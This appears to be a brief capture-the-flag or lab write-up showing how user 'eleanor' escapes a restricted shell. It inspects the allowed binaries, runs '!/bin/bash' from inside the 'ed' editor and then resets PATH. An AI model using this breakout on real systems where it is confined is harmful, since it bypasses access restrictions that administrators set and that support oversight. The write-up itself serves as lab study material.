# Escape Restricted Shell

---

1. Step is to identify the $PATH variable.

```
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
```

2. Display /home/eleanor/bin --> Because those are the only commands we can run!

```
eleanor@peppo:~$ ls -la bin
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Dec 26 18:07 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch
```

3. Use "ed" and !/bin/bash a command line editor, to escape the jail.

```
eleanor@peppo:~$ ed
!/bin/bash
```

Now we should be redirecting the path to the /bin directory, to use all functions.

```
eleanor@peppo:~$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

Escaped the restricted shell successfully.

```
eleanor@peppo:~$ whoami
eleanor
```
